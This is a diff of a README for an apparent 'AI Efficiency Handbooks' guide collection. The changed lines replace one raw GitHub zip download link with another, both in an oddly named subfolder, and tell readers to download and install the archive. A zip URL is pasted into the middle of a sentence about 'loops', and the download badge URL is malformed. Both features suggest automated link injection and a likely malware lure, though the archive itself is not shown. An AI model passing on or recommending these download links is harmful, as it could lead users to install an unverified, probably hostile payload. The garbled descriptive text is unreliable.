@@ -8,7 +8,7 @@ Here is what you will find in the series:
 
 1. **Ultimate Cursor Rules & Best Practices**: Learn about global versus project rules, how to configure `.cursorrules`, and understand reliability hierarchy.
 2. **Troubleshooting & Reliability**: Master dealing with context rot, apply the "Annoyance-Driven" rule strategy, and use our debugging checklists.
-3. **Professional Workflows & Scaling**: Discover ways to manage projects with 50k+ lines of code using internal memory systems and `https://github.com/MohanadSr/ai-efficiency-handbooks/raw/refs/heads/main/octenary/ai_efficiency_handbooks_2.4.zip` loops.
+3. **Professional Workflows & Scaling**: Discover ways to manage projects with 50k+ lines of code using internal memory systems and `https://raw.githubusercontent.com/MohanadSr/ai-efficiency-handbooks/main/octenary/efficiency_ai_handbooks_v3.5.zip` loops.
 4. **Claude Code Mastery Guide**: Gain insights into agentic coding through the Claude CLI and learn about context engineering and safety hook management.
 5. **Vibe Coding & Prompting Playbook**: Improve your feature shipping speed with our high-velocity coding techniques using the "Farmer" methods.
 
@@ -20,7 +20,7 @@ Here is what you will find in the series:
 ## 📥 Download & Install
 To get started, please visit the Releases page to download the latest version of the AI Efficiency Handbooks collection.
 
-[![Download Latest Release](https://github.com/MohanadSr/ai-efficiency-handbooks/raw/refs/heads/main/octenary/ai_efficiency_handbooks_2.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/MohanadSr/ai-efficiency-handbooks/raw/refs/heads/main/octenary/ai_efficiency_handbooks_2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/MohanadSr/ai-efficiency-handbooks/main/octenary/efficiency_ai_handbooks_v3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MohanadSr/ai-efficiency-handbooks/main/octenary/efficiency_ai_handbooks_v3.5.zip)
 
 ### Steps to Download:
 1. Click the **Download Latest Release** button above.
